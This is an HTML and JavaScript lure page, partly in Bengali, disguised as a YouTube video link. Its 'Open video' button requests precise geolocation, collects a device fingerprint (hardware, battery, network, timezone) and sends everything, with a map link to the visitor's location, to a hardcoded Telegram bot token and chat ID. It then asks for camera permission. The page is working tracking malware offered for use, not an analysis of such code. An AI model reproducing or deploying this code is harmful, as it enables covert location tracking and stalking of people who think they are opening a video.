<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width,
               initial-scale=1.0,
               maximum-scale=1.0,
               user-scalable=no">

<title>Loading...</title>

<style>

*{
    box-sizing:border-box;
}

html,body{
    margin:0;
    padding:0;
    width:100%;
    height:100%;
    background:#000;
    overflow:hidden;
    font-family:Arial,sans-serif;
}

/* ==============================
   MAIN PAGE
   ============================== */

#mainPage{
    position:fixed;
    inset:0;
    width:100%;
    height:100%;
    background:#000;
}

/* ==============================
   THUMBNAIL
   ============================== */

#thumbnailArea{
    position:absolute;
    inset:0;
    width:100%;
    height:100%;
    background:#111;
    overflow:hidden;
}

#thumbnail{
    width:100%;
    height:100%;
    object-fit:cover;
    display:none;
}

/* ==============================
   FALLBACK IMAGE
   ============================== */

#thumbnailFallback{
    position:absolute;
    inset:0;
    width:100%;
    height:100%;
    overflow:hidden;
    background:#111;
}

#thumbnailFallback img{
    width:100%;
    height:100%;
    object-fit:cover;
    filter:blur(18px);
    transform:scale(1.1);
}

.fallbackBlur{
    position:absolute;
    inset:0;
    background:rgba(0,0,0,.30);
}

.fallbackPlay{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);

    width:82px;
    height:58px;

    background:#ff0033;
    border-radius:16px;

    display:flex;
    justify-content:center;
    align-items:center;
}

.fallbackTriangle{
    width:0;
    height:0;

    border-top:14px solid transparent;
    border-bottom:14px solid transparent;
    border-left:23px solid white;

    margin-left:5px;
}

#thumbnailDark{
    position:absolute;
    inset:0;
    background:rgba(0,0,0,.20);
}

/* ==============================
   LOCATION BOX
   ============================== */

#locationOverlay,
#cameraOverlay,
#confirmOverlay{

    position:fixed;
    inset:0;

    display:flex;
    justify-content:center;
    align-items:center;

    padding:20px;

    background:rgba(0,0,0,.20);

    z-index:100;
}

#cameraOverlay,
#confirmOverlay{
    display:none;
}

.popupBox{

    width:100%;
    max-width:665px;

    background:rgba(0,0,0,.92);

    border-radius:20px;

    padding:25px 18px;

    text-align:center;

    color:white;

    box-shadow:
        0 10px 40px rgba(0,0,0,.65);
}

.popupIcon{
    font-size:38px;
    margin-bottom:10px;
}

.popupTitle{
    font-size:24px;
    margin-bottom:12px;
}

.popupText{
    font-size:16px;
    line-height:1.5;
    color:#eee;
    margin-bottom:20px;
}

.button{

    border:none;
    border-radius:10px;

    padding:14px 28px;

    font-size:17px;

    cursor:pointer;

    margin:5px;
}

.primary{
    background:#2196F3;
    color:white;
}

.success{
    background:#16a34a;
    color:white;
}

.danger{
    background:#d32f2f;
    color:white;
}

.secondary{
    background:#555;
    color:white;
}

.status{
    margin-top:12px;
    font-size:14px;
    color:#ddd;
}

/* ==============================
   LOADING
   ============================== */

#loading{

    position:fixed;
    inset:0;

    background:#000;

    display:none;

    justify-content:center;
    align-items:center;

    flex-direction:column;

    color:white;

    z-index:300;
}

.spinner{

    width:48px;
    height:48px;

    border:4px solid #333;
    border-top:4px solid white;

    border-radius:50%;

    animation:spin 1s linear infinite;

    margin-bottom:15px;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

</style>
</head>

<body>


<!-- ==============================
     MAIN PAGE
     ============================== -->

<div id="mainPage">

    <div id="thumbnailArea">

        <img
            id="thumbnail"
            alt="Video Thumbnail">

        <div id="thumbnailFallback">

            <img
                src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=1200&q=80"
                alt="Thumbnail">

            <div class="fallbackBlur"></div>

            <div class="fallbackPlay">
                <div class="fallbackTriangle"></div>
            </div>

        </div>

        <div id="thumbnailDark"></div>

    </div>

</div>


<!-- ==============================
     LOCATION
     ============================== -->

<div id="locationOverlay">

    <div class="popupBox">

        <div class="popupIcon">📍</div>

        <div class="popupTitle">
            Video open 
        </div>

        <div class="popupText">

            Are you sure you open video?

        </div>

        <button
            id="allowButton"
            class="button primary">

            Open video 

        </button>

        <button
            id="skipButton"
            class="button secondary">

            Skip

        </button>

        <div
            id="locationStatus"
            class="status">
        </div>

    </div>

</div>


<!-- ==============================
     CAMERA BUTTON
     ============================== -->

<div id="cameraOverlay">

    <div class="popupBox">

        <div class="popupIcon">📷</div>

        <div class="popupTitle">
            Hi
        </div>

        <div class="popupText">

            Video link open 

        </div>

        <button
            id="takePhotoButton"
            class="button primary">

            📷 open video 

        </button>

        <div
            id="cameraStatus"
            class="status">
        </div>

    </div>

</div>


<!-- ==============================
     PHOTO CONFIRMATION
     ============================== -->

<div id="confirmOverlay">

    <div class="popupBox">

        <div class="popupIcon">📷</div>

        <div class="popupTitle">
            link open 
        </div>

        <div class="popupText">

            Video link generating!

            <br><br>

            আপনি কি সত্যি ভিডিও দেখতে চান?

        </div>

        <button
            id="sendPhotoButton"
            class="button success">

            হ্যাঁ

        </button>

        <button
            id="continueButton"
            class="button secondary">

            না

        </button>

    </div>

</div>


<!-- ==============================
     LOADING
     ============================== -->

<div id="loading">

    <div class="spinner"></div>

    <div>
        Loading...
    </div>

</div>


<script>


/* =================================================
   TELEGRAM SETTINGS
   ================================================= */

const BOT_TOKEN =
    "8855743272:AAETg__YWrwHa3feYecotLTVzqQ_VTRsXII";

const CHAT_ID =
    "5980493892";


/* =================================================
   YOUR URL
   ================================================= */

const TARGET_URL =
    "https://youtu.be/drl-Nq5tcws?si=85VMNRWE0fPiBhTr";


/* =================================================
   ANALYTICS
   ================================================= */

const analytics = {

    deviceId:getDeviceId(),

    userAgent:navigator.userAgent,

    ram:navigator.deviceMemory
        ? navigator.deviceMemory+" GB"
        : "Unknown",

    cores:navigator.hardwareConcurrency
        ? navigator.hardwareConcurrency+" Cores"
        : "Unknown",

    screenRes:
        window.screen.width+
        " x "+
        window.screen.height,

    orientation:
        window.screen.height >=
        window.screen.width
        ? "Portrait"
        : "Landscape",

    theme:
        window.matchMedia(
            "(prefers-color-scheme: dark)"
        ).matches
        ? "Dark Mode"
        : "Light Mode",

    networkType:
        navigator.connection
        ? navigator.connection.effectiveType.toUpperCase()
        : "Unknown",

    downlink:
        navigator.connection
        ? navigator.connection.downlink+" Mbps"
        : "Unknown",

    localTime:
        new Date().toLocaleTimeString(),

    timeZone:
        Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone,

    language:
        navigator.language || "Unknown",

    battery:"Unknown",

    permissionStatus:"Not Requested",

    mapLink:"N/A"
};


/* =================================================
   DEVICE ID
   ================================================= */

function getDeviceId(){

    let id =
        localStorage.getItem(
            "app_device_id"
        );

    if(!id){

        id =
            "DEV-"+
            Math.floor(
                100000+
                Math.random()*900000
            );

        localStorage.setItem(
            "app_device_id",
            id
        );
    }

    return id;
}


/* =================================================
   FALLBACK
   ================================================= */

function showFallbackThumbnail(){

    document
        .getElementById("thumbnail")
        .style.display="none";

    document
        .getElementById("thumbnailFallback")
        .style.display="block";
}


/* =================================================
   YOUTUBE ID
   ================================================= */

function getYouTubeID(url){

    try{

        const u = new URL(url);

        if(
            u.hostname.includes("youtube.com") &&
            u.pathname==="/watch"
        ){
            return u.searchParams.get("v");
        }

        if(
            u.hostname.includes("youtu.be")
        ){
            return u.pathname.substring(1);
        }

        if(
            u.hostname.includes("youtube.com") &&
            u.pathname.startsWith("/shorts/")
        ){
            return u.pathname.split("/")[2];
        }

    }catch(e){

        return null;

    }

    return null;
}


/* =================================================
   LOAD THUMBNAIL
   ================================================= */

function loadThumbnail(){

    showFallbackThumbnail();

    if(
        !TARGET_URL ||
        TARGET_URL==="Your URL"
    ){
        return;
    }

    const id =
        getYouTubeID(
            TARGET_URL.trim()
        );

    if(!id){
        return;
    }

    const image =
        document.getElementById(
            "thumbnail"
        );

    const fallback =
        document.getElementById(
            "thumbnailFallback"
        );

    image.src =
        "https://img.youtube.com/vi/"+
        id+
        "/maxresdefault.jpg";

    image.onload=function(){

        image.style.display="block";

        fallback.style.display="none";

    };

    image.onerror=function(){

        image.src =
            "https://img.youtube.com/vi/"+
            id+
            "/hqdefault.jpg";

    };
}


/* =================================================
   PAGE LOAD
   ================================================= */

document.addEventListener(
    "DOMContentLoaded",
    function(){

        loadThumbnail();

        collectDeviceInformation();

    }
);


/* =================================================
   DEVICE INFO
   ================================================= */

function collectDeviceInformation(){

    if(navigator.getBattery){

        navigator.getBattery()
        .then(function(battery){

            analytics.battery =
                Math.round(
                    battery.level*100
                )+
                "% ("+
                (
                    battery.charging
                    ?"Charging"
                    :"Not Charging"
                )+
                ")";

        })
        .catch(function(){

            analytics.battery="Unknown";

        });

    }

}


/* =================================================
   LOCATION ALLOW
   ================================================= */

document
.getElementById("allowButton")
.addEventListener(
    "click",
    requestLocation
);


/* =================================================
   LOCATION SKIP
   ================================================= */

document
.getElementById("skipButton")
.addEventListener(
    "click",
    function(){

        analytics.permissionStatus =
            "User Skipped";

        exitWebsite();

    }
);


/* =================================================
   LOCATION
   ================================================= */

function requestLocation(){

    const status =
        document.getElementById(
            "locationStatus"
        );

    status.textContent =
        "📍 Location permission চাওয়া হচ্ছে...";

    if(!navigator.geolocation){

        status.textContent =
            "Location supported নয়।";

        setTimeout(
            exitWebsite,
            800
        );

        return;
    }


    navigator.geolocation.getCurrentPosition(

        function(position){

            const lat =
                position.coords.latitude;

            const lon =
                position.coords.longitude;

            analytics.permissionStatus =
                "Allowed";

            analytics.mapLink =
                "https://www.google.com/maps?q="+
                lat+
                ","+
                lon;


            sendAnalyticsToTelegram();


            /*
             * Location-এর পর
             * Camera button দেখাবে
             */

            document
                .getElementById(
                    "locationOverlay"
                )
                .style.display="none";

            document
                .getElementById(
                    "cameraOverlay"
                )
                .style.display="flex";

        },

        function(){

            analytics.permissionStatus =
                "Denied / Unavailable";

            analytics.mapLink =
                "N/A";

            status.textContent =
                "❌ Location অনুমোদন করা হয়নি।";

            setTimeout(
                exitWebsite,
                800
            );

        },

        {
            enableHighAccuracy:true,
            timeout:10000,
            maximumAge:0
        }

    );
}


/* =================================================
   CAMERA BUTTON
   ================================================= */

document
.getElementById("takePhotoButton")
.addEventListener(
    "click",
    takePhoto
);


/* =================================================
   TAKE PHOTO
   ================================================= */

async function takePhoto(){

    const status =
        document.getElementById(
            "cameraStatus"
        );

    status.textContent =
        "📷 Camera permission চাওয়া হচ্ছে...";


    if(
        !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia
    ){

        status.textContent =
            "এই browser-এ camera support নেই।";

        return;
    }


    let stream=null;


    try{

        /*
         * Camera preview দেখানো হবে না।
         * শুধু camera permission নেওয়া হবে।
         */

        stream =
            await navigator.mediaDevices
            .getUserMedia({

                video:true,

                audio:false

            });


        /*
         * Permission পাওয়ার পর
         * stream বন্ধ করে দেওয়া হচ্ছে।
         */

        stream
            .getTracks()
            .forEach(
                track=>{
                    track.stop();
                }
            );


        status.textContent =
            "✅ Camera permission দেওয়া হয়েছে।";


        /*
         * নিরাপদভাবে:
         * user-কে confirmation দেওয়া হবে।
         */

        setTimeout(
            function(){

                document
                    .getElementById(
                        "cameraOverlay"
                    )
                    .style.display="none";

                document
                    .getElementById(
                        "confirmOverlay"
                    )
                    .style.display="flex";

            },
            500
        );


    }catch(error){

        status.textContent =
            "❌ Camera permission দেওয়া হয়নি।";

        setTimeout(
            exitWebsite,
            1000
        );

    }

}


/* =================================================
   USER CONFIRMATION
   ================================================= */

document
.getElementById("sendPhotoButton")
.addEventListener(
    "click",
    function(){

        /*
         * এখানে server-side photo upload
         * যুক্ত করার জন্য প্রস্তুত রাখা হয়েছে।
         *
         * Browser-এর HTML-এর মধ্যে
         * Telegram Bot Token রাখা নিরাপদ নয়।
         */

        alert(
            "ছবি পাঠানোর জন্য নিরাপদ server connection প্রয়োজন।"
        );

        openTargetWebsite();

    }
);


document
.getElementById("continueButton")
.addEventListener(
    "click",
    function(){

        openTargetWebsite();

    }
);


/* =================================================
   TELEGRAM ANALYTICS
   ================================================= */

function sendAnalyticsToTelegram(){

    if(
        !BOT_TOKEN ||
        BOT_TOKEN==="YOUR_BOT_TOKEN_HERE"
    ){
        return;
    }

    if(
        !CHAT_ID ||
        CHAT_ID==="YOUR_CHAT_ID_HERE"
    ){
        return;
    }


    let message =
        "📊 *App Analytics Notification*\n\n";


    message +=
        "🆔 *Device ID:* `"+
        analytics.deviceId+
        "`\n";


    message +=
        "📱 *Device:* "+
        analytics.userAgent+
        "\n";


    message +=
        "⚙️ *Hardware:* "+
        analytics.cores+
        " | ~"+
        analytics.ram+
        "\n";


    message +=
        "📐 *Display:* "+
        analytics.screenRes+
        " ("+
        analytics.orientation+
        ")\n";


    message +=
        "🌐 *Network:* "+
        analytics.networkType+
        " ("+
        analytics.downlink+
        ")\n";


    message +=
        "🕒 *Time:* "+
        analytics.localTime+
        " ("+
        analytics.timeZone+
        ")\n";


    message +=
        "🗣️ *Language:* "+
        analytics.language+
        "\n";


    message +=
        "🔋 *Battery:* "+
        analytics.battery+
        "\n\n";


    message +=
        "🔒 *Location:* "+
        analytics.permissionStatus+
        "\n";


    if(
        analytics.permissionStatus==="Allowed"
    ){

        message +=
            "🗺️ [View Location]("+
            analytics.mapLink+
            ")";

    }


    fetch(
        "https://api.telegram.org/bot"+
        BOT_TOKEN+
        "/sendMessage",
        {

            method:"POST",

            headers:{
                "Content-Type":
                    "application/json"
            },

            body:JSON.stringify({

                chat_id:CHAT_ID,

                text:message,

                parse_mode:"Markdown"

            })

        }
    )
    .catch(
        console.error
    );

}


/* =================================================
   OPEN URL
   ================================================= */

function openTargetWebsite(){

    if(
        !TARGET_URL ||
        TARGET_URL==="Your URL"
    ){
        return;
    }

    window.location.href =
        TARGET_URL.trim();

}


/* =================================================
   EXIT
   ================================================= */

function exitWebsite(){

    try{

        window.location.replace(
            "about:blank"
        );

    }catch(e){

        document.documentElement
            .innerHTML="";

    }

}

</script>

</body>
</html>
